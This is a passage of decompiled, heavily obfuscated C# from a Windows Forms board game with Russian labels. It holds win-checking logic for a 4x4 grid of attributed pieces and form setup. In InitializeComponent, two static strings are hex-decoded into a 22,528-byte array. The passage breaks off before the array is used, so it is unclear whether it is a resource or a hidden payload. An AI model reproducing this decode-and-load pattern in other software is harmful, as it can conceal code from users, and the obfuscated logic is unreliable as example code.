						num57 = 128646968;
					}
					else
					{
						num = 511035499;
						num57 = 511035499;
					}
					continue;
				}
				case 67u:
					if (mem[num5, 2].Big != mem[num5, 3].Big)
					{
						num = ((int)num2 * -119040904) ^ 0x32CB0011;
						continue;
					}
					goto IL_020a;
				case 66u:
					if (mem[0, 3] != null)
					{
						num = 705344407;
						continue;
					}
					goto IL_0224;
				case 65u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)(num2 * 759796225) ^ -82233924;
						continue;
					}
					goto IL_0260;
				case 64u:
				{
					int num12;
					if (mem[num5, 0].Point == mem[num5, 1].Point)
					{
						num = 1827809802;
						num12 = 1827809802;
					}
					else
					{
						num = 1676658330;
						num12 = 1676658330;
					}
					continue;
				}
				case 63u:
					num5++;
					num = 1666425075;
					continue;
				case 62u:
				{
					int num66;
					int num67;
					if (!flag4)
					{
						num66 = 79883400;
						num67 = 79883400;
					}
					else
					{
						num66 = 1668683238;
						num67 = 1668683238;
					}
					num = num66 ^ (int)(num2 * 1732647469);
					continue;
				}
				case 61u:
				{
					int num60;
					int num61;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num60 = -1976440963;
						num61 = -1976440963;
					}
					else
					{
						num60 = -1352884315;
						num61 = -1352884315;
					}
					num = num60 ^ (int)(num2 * 577334095);
					continue;
				}
				case 60u:
					if (mem[num5, 2].Dark != mem[num5, 3].Dark)
					{
						num = ((int)num2 * -520019922) ^ 0x2B90F6EC;
						continue;
					}
					goto IL_020a;
				case 59u:
				{
					int num47;
					int num48;
					if (mem[num5, 1].Square == mem[num5, 2].Square)
					{
						num47 = 1361783211;
						num48 = 1361783211;
					}
					else
					{
						num47 = 1186023916;
						num48 = 1186023916;
					}
					num = num47 ^ (int)(num2 * 2145629874);
					continue;
				}
				case 58u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)((num2 * 1471142360) ^ 0x1A725BD8);
						continue;
					}
					goto IL_03b4;
				case 57u:
				{
					int num36;
					if (mem[0, 0].Square != mem[1, 1].Square)
					{
						num = 659266627;
						num36 = 659266627;
					}
					else
					{
						num = 1153515171;
						num36 = 1153515171;
					}
					continue;
				}
				case 56u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)((num2 * 1944968422) ^ 0x7C6673F7);
						continue;
					}
					goto IL_0260;
				case 55u:
				{
					int num21;
					int num22;
					if (mem[num5, 1].Dark != mem[num5, 2].Dark)
					{
						num21 = -651577562;
						num22 = -651577562;
					}
					else
					{
						num21 = -1296791804;
						num22 = -1296791804;
					}
					num = num21 ^ (int)(num2 * 231502578);
					continue;
				}
				case 54u:
				{
					int num13;
					if (mem[0, num5].Point == mem[1, num5].Point)
					{
						num = 1006688129;
						num13 = 1006688129;
					}
					else
					{
						num = 1095324302;
						num13 = 1095324302;
					}
					continue;
				}
				case 53u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -472414321) ^ -993719823;
						continue;
					}
					goto IL_0224;
				case 52u:
					num6 = ((mem[2, num5].Square == mem[3, num5].Square) ? 1 : 0);
					goto IL_0116;
				case 51u:
				{
					int num70;
					int num71;
					if (mem[num5, 0].Big == mem[num5, 1].Big)
					{
						num70 = 1727885498;
						num71 = 1727885498;
					}
					else
					{
						num70 = 895064877;
						num71 = 895064877;
					}
					num = num70 ^ ((int)num2 * -1777973698);
					continue;
				}
				case 50u:
					if (mem[num5, 2].Point != mem[num5, 3].Point)
					{
						num = ((int)num2 * -666429318) ^ 0x2EE42356;
						continue;
					}
					goto IL_020a;
				case 49u:
				{
					int num68;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = 771339238;
						num68 = 771339238;
					}
					else
					{
						num = 1784373347;
						num68 = 1784373347;
					}
					continue;
				}
				case 48u:
					num = 1700669887;
					continue;
				case 47u:
				{
					int num55;
					int num56;
					if (mem[num5, 2] != null)
					{
						num55 = -2071765052;
						num56 = -2071765052;
					}
					else
					{
						num55 = -164210530;
						num56 = -164210530;
					}
					num = num55 ^ ((int)num2 * -603481083);
					continue;
				}
				case 46u:
				{
					int num51;
					int num52;
					if (mem[0, num5].Big == mem[1, num5].Big)
					{
						num51 = 656357490;
						num52 = 656357490;
					}
					else
					{
						num51 = 1407024352;
						num52 = 1407024352;
					}
					num = num51 ^ ((int)num2 * -969055212);
					continue;
				}
				case 45u:
					num = (int)((num2 * 79729876) ^ 0x3DE71E54);
					continue;
				case 44u:
				{
					int num46;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 1053009030;
						num46 = 1053009030;
					}
					else
					{
						num = 323213744;
						num46 = 323213744;
					}
					continue;
				}
				case 43u:
				{
					int num43;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 2021091908;
						num43 = 2021091908;
					}
					else
					{
						num = 797528775;
						num43 = 797528775;
					}
					continue;
				}
				case 42u:
					if (mem[2, num5].Dark != mem[3, num5].Dark)
					{
						num = ((int)num2 * -1194124034) ^ -2025535863;
						continue;
					}
					goto IL_0115;
				case 41u:
					if (mem[0, num5].Square == mem[1, num5].Square)
					{
						num = 1533360894;
						continue;
					}
					goto IL_0191;
				case 40u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 1685115547) ^ 0x11B1EAFD);
						continue;
					}
					goto IL_0260;
				case 39u:
				{
					int num33;
					int num34;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num33 = -2077412904;
						num34 = -2077412904;
					}
					else
					{
						num33 = -1673246651;
						num34 = -1673246651;
					}
					num = num33 ^ (int)(num2 * 1757821493);
					continue;
				}
				case 38u:
				{
					int num27;
					int num28;
					if (mem[0, 0] != null)
					{
						num27 = 780647560;
						num28 = 780647560;
					}
					else
					{
						num27 = 1214671325;
						num28 = 1214671325;
					}
					num = num27 ^ ((int)num2 * -143346922);
					continue;
				}
				case 37u:
					if (mem[2, 1] != null)
					{
						num = (int)((num2 * 1428322806) ^ 0x22806D53);
						continue;
					}
					goto IL_0224;
				case 36u:
				{
					int num16;
					int num17;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num16 = 1010638461;
						num17 = 1010638461;
					}
					else
					{
						num16 = 315923372;
						num17 = 315923372;
					}
					num = num16 ^ (int)(num2 * 1250743593);
					continue;
				}
				case 34u:
					flag = true;
					num = ((int)num2 * -382222610) ^ -411306249;
					continue;
				case 33u:
				{
					int num9;
					int num10;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num9 = 245789534;
						num10 = 245789534;
					}
					else
					{
						num9 = 1594641757;
						num10 = 1594641757;
					}
					num = num9 ^ (int)(num2 * 2093187310);
					continue;
				}
				case 32u:
					flag = false;
					num5 = 0;
					num = (int)(num2 * 1077094583) ^ -1835363842;
					continue;
				case 31u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 890687283;
						continue;
					}
					goto IL_0877;
				case 30u:
				{
					int num72;
					int num73;
					if (mem[num5, 1] == null)
					{
						num72 = 229119122;
						num73 = 229119122;
					}
					else
					{
						num72 = 1154791253;
						num73 = 1154791253;
					}
					num = num72 ^ ((int)num2 * -811022394);
					continue;
				}
				case 28u:
				{
					int num69;
					if (mem[num5, 0].Dark == mem[num5, 1].Dark)
					{
						num = 800568867;
						num69 = 800568867;
					}
					else
					{
						num = 391756386;
						num69 = 391756386;
					}
					continue;
				}
				case 27u:
					if (mem[0, num5] != null)
					{
						num = 1968318937;
						continue;
					}
					goto IL_08f8;
				case 26u:
				{
					int num62;
					int num63;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num62 = -1723526175;
						num63 = -1723526175;
					}
					else
					{
						num62 = -954522199;
						num63 = -954522199;
					}
					num = num62 ^ ((int)num2 * -1975650947);
					continue;
				}
				case 25u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)((num2 * 1592814241) ^ 0x7EC5EFC6);
						continue;
					}
					goto IL_0260;
				case 24u:
				{
					int num58;
					int num59;
					if (mem[1, num5].Point != mem[2, num5].Point)
					{
						num58 = 768511310;
						num59 = 768511310;
					}
					else
					{
						num58 = 970699004;
						num59 = 970699004;
					}
					num = num58 ^ ((int)num2 * -454596068);
					continue;
				}
				case 23u:
					num11 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0225;
				case 22u:
				{
					int num53;
					int num54;
					if (mem[num5, 1].Point != mem[num5, 2].Point)
					{
						num53 = -301808668;
						num54 = -301808668;
					}
					else
					{
						num53 = -1568061263;
						num54 = -1568061263;
					}
					num = num53 ^ ((int)num2 * -359311782);
					continue;
				}
				case 21u:
				{
					int num49;
					int num50;
					if (mem[1, num5].Big == mem[2, num5].Big)
					{
						num49 = 1467373460;
						num50 = 1467373460;
					}
					else
					{
						num49 = 2086814718;
						num50 = 2086814718;
					}
					num = num49 ^ ((int)num2 * -1115560526);
					continue;
				}
				case 20u:
					flag = true;
					num = (int)(num2 * 1918973479) ^ -592906333;
					continue;
				case 19u:
					result = flag;
					num = 1685214576;
					continue;
				case 18u:
					if (mem[3, num5] != null)
					{
						num = ((int)num2 * -338893920) ^ -228882369;
						continue;
					}
					goto IL_08f8;
				case 17u:
				{
					int num44;
					int num45;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num44 = -1808635462;
						num45 = -1808635462;
					}
					else
					{
						num44 = -1593248907;
						num45 = -1593248907;
					}
					num = num44 ^ (int)(num2 * 1879711060);
					continue;
				}
				case 16u:
					if (mem[2, num5] != null)
					{
						num = (int)((num2 * 655087896) ^ 0x2C8F91C3);
						continue;
					}
					goto IL_08f8;
				case 15u:
					if (mem[num5, 2].Square != mem[num5, 3].Square)
					{
						num = ((int)num2 * -1921805968) ^ 0x611E4118;
						continue;
					}
					goto IL_020a;
				case 14u:
				{
					int num41;
					int num42;
					if (mem[2, 2] == null)
					{
						num41 = 1241766309;
						num42 = 1241766309;
					}
					else
					{
						num41 = 1309107863;
						num42 = 1309107863;
					}
					num = num41 ^ ((int)num2 * -993228862);
					continue;
				}
				case 13u:
				{
					int num39;
					int num40;
					if (!flag3)
					{
						num39 = 2030379746;
						num40 = 2030379746;
					}
					else
					{
						num39 = 2053606900;
						num40 = 2053606900;
					}
					num = num39 ^ (int)(num2 * 124851453);
					continue;
				}
				case 12u:
					if (mem[2, num5].Point != mem[3, num5].Point)
					{
						num = (int)((num2 * 640852257) ^ 0x75EBAC43);
						continue;
					}
					goto IL_0115;
				case 11u:
				{
					int num35;
					if (mem[0, num5].Dark == mem[1, num5].Dark)
					{
						num = 39326822;
						num35 = 39326822;
					}
					else
					{
						num = 357050487;
						num35 = 357050487;
					}
					continue;
				}
				case 10u:
				{
					int num31;
					int num32;
					if (mem[num5, 3] == null)
					{
						num31 = -468630411;
						num32 = -468630411;
					}
					else
					{
						num31 = -808310054;
						num32 = -808310054;
					}
					num = num31 ^ (int)(num2 * 356613695);
					continue;
				}
				case 9u:
				{
					int num25;
					int num26;
					if (flag2)
					{
						num25 = 554676121;
						num26 = 554676121;
					}
					else
					{
						num25 = 968276679;
						num26 = 968276679;
					}
					num = num25 ^ (int)(num2 * 1338365346);
					continue;
				}
				case 8u:
					if (mem[1, num5] != null)
					{
						num = ((int)num2 * -1616271547) ^ -1468891976;
						continue;
					}
					goto IL_08f8;
				case 7u:
				{
					int num20;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 1722252251;
						num20 = 1722252251;
					}
					else
					{
						num = 753295155;
						num20 = 753295155;
					}
					continue;
				}
				case 6u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -1561302302) ^ 0x5777FB8C;
						continue;
					}
					goto IL_03b4;
				case 5u:
				{
					int num14;
					int num15;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num14 = 480171777;
						num15 = 480171777;
					}
					else
					{
						num14 = 235267814;
						num15 = 235267814;
					}
					num = num14 ^ ((int)num2 * -265314637);
					continue;
				}
				case 4u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -601408447) ^ -1447061642;
						continue;
					}
					goto IL_03b4;
				case 3u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 76443392) ^ -877194382;
						continue;
					}
					goto IL_0224;
				case 2u:
				{
					int num7;
					int num8;
					if (mem[3, 3] == null)
					{
						num7 = 763664259;
						num8 = 763664259;
					}
					else
					{
						num7 = 156432480;
						num8 = 156432480;
					}
					num = num7 ^ (int)(num2 * 53184714);
					continue;
				}
				case 1u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -1243701908) ^ -1120369554;
						continue;
					}
					goto IL_0877;
				case 0u:
				{
					int num3;
					int num4;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num3 = -1568546877;
						num4 = -1568546877;
					}
					else
					{
						num3 = -1383236754;
						num4 = -1383236754;
					}
					num = num3 ^ (int)(num2 * 804751888);
					continue;
				}
				case 35u:
					break;
				default:
					{
						return result;
					}
					IL_0191:
					num6 = 0;
					goto IL_0116;
					IL_0877:
					num11 = 0;
					goto IL_0225;
					IL_0260:
					num11 = 1;
					goto IL_0225;
					IL_0224:
					num11 = 0;
					goto IL_0225;
					IL_0225:
					flag3 = (byte)num11 != 0;
					num = 1812840520;
					continue;
					IL_03b4:
					num11 = 1;
					goto IL_0225;
					IL_020a:
					num6 = 1;
					goto IL_0116;
					IL_0115:
					num6 = 1;
					goto IL_0116;
					IL_08f8:
					num6 = 0;
					goto IL_0116;
					IL_0116:
					flag2 = (byte)num6 != 0;
					num = 1070540214;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		int num3 = default(int);
		bool flag4 = default(bool);
		bool flag3 = default(bool);
		int num4 = default(int);
		while (true)
		{
			int num = 1171564918;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x201770A7u) % 16u)
				{
				case 15u:
				{
					int num7;
					int num8;
					if (flag)
					{
						num7 = -1043149271;
						num8 = -1043149271;
					}
					else
					{
						num7 = -992121640;
						num8 = -992121640;
					}
					num = num7 ^ ((int)num2 * -554778763);
					continue;
				}
				case 14u:
					result = flag2;
					num = ((int)num2 * -1577221286) ^ -357152190;
					continue;
				case 13u:
					num = ((int)num2 * -652859650) ^ -1925088589;
					continue;
				case 12u:
					num3 = 0;
					num = 716236039;
					continue;
				case 11u:
				{
					int num9;
					int num10;
					if (!flag4)
					{
						num9 = 1208500786;
						num10 = 1208500786;
					}
					else
					{
						num9 = 1421235100;
						num10 = 1421235100;
					}
					num = num9 ^ (int)(num2 * 810269769);
					continue;
				}
				case 9u:
					num = ((int)num2 * -2098589909) ^ 0x51580177;
					continue;
				case 8u:
					flag2 = false;
					num = ((int)num2 * -555738540) ^ 0x1C2A2001;
					continue;
				case 7u:
				{
					int num5;
					int num6;
					if (flag3)
					{
						num5 = 1958670424;
						num6 = 1958670424;
					}
					else
					{
						num5 = 1643838026;
						num6 = 1643838026;
					}
					num = num5 ^ (int)(num2 * 1502196613);
					continue;
				}
				case 6u:
					num3++;
					num = 716236039;
					continue;
				case 5u:
					flag4 = mem[num4, num3] == null;
					num = 1061898460;
					continue;
				case 4u:
					num4++;
					num = (int)((num2 * 1050644460) ^ 0xCC63F85);
					continue;
				case 2u:
					flag3 = num4 < 4;
					num = 1488808960;
					continue;
				case 1u:
					flag2 = true;
					num4 = 0;
					num = (int)(num2 * 2138097633) ^ -290879445;
					continue;
				case 0u:
					flag = num3 < 4;
					num = 1085908744;
					continue;
				case 10u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -1073450413;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF6BB53BCu) % 10u)
				{
				case 9u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 783189326) ^ 0xFEA472A);
					continue;
				case 8u:
					num = (int)(num2 * 805706278) ^ -585033048;
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = (int)((num2 * 1725781612) ^ 0x8054607);
					continue;
				case 5u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -380456681) ^ -1175596006;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)(num2 * 1143520706) ^ -935292395;
					continue;
				case 2u:
					num = (int)(num2 * 885567602) ^ -1041548765;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1310864632) ^ 0x3408E47A;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -400842553) ^ 0x3D2396A4;
					continue;
				default:
					return;
				case 6u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing)
		{
			goto IL_0009;
		}
		int num = 0;
		goto IL_009f;
		IL_0096:
		num = ((components != null) ? 1 : 0);
		goto IL_009f;
		IL_0009:
		int num2 = 1184811255;
		goto IL_0069;
		IL_0069:
		bool flag = default(bool);
		while (true)
		{
			uint num3;
			switch ((num3 = (uint)num2 ^ 0x3E1E285Cu) % 7u)
			{
			case 6u:
				break;
			case 4u:
			{
				int num4;
				int num5;
				if (!flag)
				{
					num4 = 607002658;
					num5 = 607002658;
				}
				else
				{
					num4 = 490780064;
					num5 = 490780064;
				}
				num2 = num4 ^ (int)(num3 * 1258113065);
				continue;
			}
			case 3u:
				Form1.smethod_51((IDisposable)components);
				num2 = ((int)num3 * -2088031831) ^ -281777974;
				continue;
			case 2u:
				num2 = ((int)num3 * -63148912) ^ 0x6736E684;
				continue;
			case 0u:
				((Form)this).Dispose(disposing);
				num2 = 518452148;
				continue;
			default:
				return;
			case 1u:
				goto IL_0096;
			case 5u:
				return;
			}
			break;
		}
		goto IL_0009;
		IL_009f:
		flag = (byte)num != 0;
		num2 = 773140460;
		goto IL_0069;
	}

	private void InitializeComponent()
	{
		//IL_07ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_07f8: Expected O, but got Unknown
		components = Form1.smethod_52();
		pictureBox1 = Form1.smethod_2();
		bool flag = default(bool);
		byte[] array = default(byte[]);
		int num3 = default(int);
		string string_ = default(string);
		object[] object_ = default(object[]);
		while (true)
		{
			int num = -581449882;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xEC8420CBu) % 129u)
				{
				case 128u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -570998275) ^ 0x42D2F972;
					continue;
				case 127u:
					num = ((int)num2 * -1762009491) ^ -344615239;
					continue;
				case 126u:
					num = ((int)num2 * -342137457) ^ -577872752;
					continue;
				case 125u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)(num2 * 1810010392) ^ -1162542052;
					continue;
				case 124u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = -697201051;
						num5 = -697201051;
					}
					else
					{
						num4 = -795538172;
						num5 = -795538172;
					}
					num = num4 ^ ((int)num2 * -1350115910);
					continue;
				}
				case 123u:
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = ((int)num2 * -437001033) ^ 0x4E31EF7D;
					continue;
				case 122u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)((num2 * 1654565607) ^ 0x553F3301);
					continue;
				case 121u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 265226692) ^ 0x242FF7FB);
					continue;
				case 120u:
					num = (int)(num2 * 2052059802) ^ -367297813;
					continue;
				case 119u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)(num2 * 113556133) ^ -1370869442;
					continue;
				case 118u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = (int)((num2 * 5377249) ^ 0x500396B);
					continue;
				case 117u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)((num2 * 1836197000) ^ 0x1B23650E);
					continue;
				case 116u:
					num = (int)(num2 * 299693125) ^ -124935945;
					continue;
				case 115u:
					richTextBox1 = Form1.smethod_54();
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -1440871880) ^ 0x2EF4FCFD;
					continue;
				case 114u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)(num2 * 2112953769) ^ -279938604;
					continue;
				case 113u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 302961405) ^ 0x54BDB588);
					continue;
				case 112u:
					num = ((int)num2 * -46865999) ^ -1438231659;
					continue;
				case 111u:
					num = ((int)num2 * -543573312) ^ 0x48F55F33;
					continue;
				case 110u:
					num = ((int)num2 * -1292679667) ^ -448089190;
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)(num2 * 1914191833) ^ -1582503720;
					continue;
				case 108u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -682442396) ^ -959413419;
					continue;
				case 107u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -405735447) ^ 0x2D36D569;
					continue;
				case 105u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -602217849) ^ -620911390;
					continue;
				case 104u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -120065601) ^ 0x23AF637;
					continue;
				case 103u:
					num = (int)(num2 * 1990862183) ^ -711512218;
					continue;
				case 102u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 1231606883) ^ -268029021;
					continue;
				case 101u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = -162799093;
					continue;
				case 100u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -308763499) ^ -1141360668;
					continue;
				case 99u:
					num = (int)(num2 * 846202583) ^ -647583665;
					continue;
				case 98u:
					num = ((int)num2 * -203905803) ^ 0x23153BDA;
					continue;
				case 97u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1065779008) ^ -459454186;
					continue;
				case 96u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 1052903820) ^ -1069052564;
					continue;
				case 95u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1115576358) ^ 0x666C91C4;
					continue;
				case 94u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 535281567) ^ -930862796;
					continue;
				case 93u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1144397687) ^ -1483103593;
					continue;
				case 92u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1554729526) ^ -1243656461;
					continue;
				case 91u:
					Form1.smethod_62(pictureBox1, 0);
					num = ((int)num2 * -1674362445) ^ -881000507;
					continue;
				case 90u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 1157122616) ^ -619132426;
					continue;
				case 89u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1955581422) ^ 0x779112E2);
					continue;
				case 88u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 740354320) ^ 0x2FACAD98);
					continue;
				case 87u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)((num2 * 88752974) ^ 0x625B65C0);
					continue;
				case 86u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1043361489) ^ -1708353659;
					continue;
				case 85u:
					num = ((int)num2 * -234256091) ^ 0x2CDD9DB3;
					continue;
				case 84u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)(num2 * 422677284) ^ -1857825550;
					continue;
				case 83u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -1679339235) ^ 0x527EAA8A;
					continue;
				case 82u:
					num = (int)((num2 * 425612294) ^ 0x1C27A99E);
					continue;
				case 81u:
					num = (int)((num2 * 1709714850) ^ 0xB8DAEFC);
					continue;
				case 80u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1278467707) ^ -833389253;
					continue;
				case 79u:
					num = ((int)num2 * -495125276) ^ 0x41EF1FFC;
					continue;
				case 78u:
					string_ = Veet.Sa;
					num = (int)((num2 * 46197186) ^ 0x7E3FF5DB);
					continue;
				case 77u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = ((int)num2 * -747586221) ^ -343869934;
					continue;
				case 76u:
					num = (int)((num2 * 1628820741) ^ 0x41A42A7D);
					continue;
				case 75u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 774935756) ^ 0x40120BD8);
					continue;
				case 74u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = (int)((num2 * 1118809482) ^ 0x6632644C);
					continue;
				case 73u:
					num = ((int)num2 * -525777326) ^ 0x1CC44323;
					continue;
				case 72u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 1802309210) ^ -936005200;
					continue;
				case 70u:
					num = ((int)num2 * -216336392) ^ -137105723;
					continue;
				case 69u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					num = ((int)num2 * -776786848) ^ 0xA63D1E;
					continue;
				case 68u:
					num = (int)((num2 * 329555297) ^ 0x6DB13C8F);
					continue;
				case 67u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 2119088202) ^ 0x8EE75);
					continue;
				case 66u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)(num2 * 1427574018) ^ -448826323;
					continue;
				case 65u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 164459224) ^ -1820321979;
					continue;
				case 64u:
					flag = num3 < 22528;
					num = -2049102919;
					continue;
				case 63u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -981830866) ^ 0x31B774D2;
					continue;
				case 62u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)(num2 * 669855828) ^ -1998458173;
					continue;
				case 61u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -1142637259) ^ 0x6A3EF7C5;
					continue;
				case 60u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -759158197) ^ 0x60B2C097;
					continue;
				case 59u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1813772984) ^ -1826909108;
					continue;
				case 58u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = (int)((num2 * 400017503) ^ 0x369842A4);
					continue;
				case 57u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -1850526963) ^ 0x3568B4A8;
					continue;
				case 56u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = ((int)num2 * -82162990) ^ -2073781234;
					continue;
				case 55u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -573958305) ^ -445383448;
					continue;
				case 54u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -2013046492) ^ -367307239;
					continue;
				case 53u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 1539504289) ^ 0x3AE3B880);
					continue;
				case 52u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 419813441) ^ 0x236F1FAF);
					continue;
				case 51u:
					num = (int)((num2 * 1352158494) ^ 0x51D6FD92);
					continue;
				case 50u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 392938436) ^ 0x3023287);
					continue;
				case 49u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1104814313) ^ 0x6D35C88C);
					continue;
				case 48u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)((num2 * 315184533) ^ 0x2998EECB);
					continue;
				case 47u:
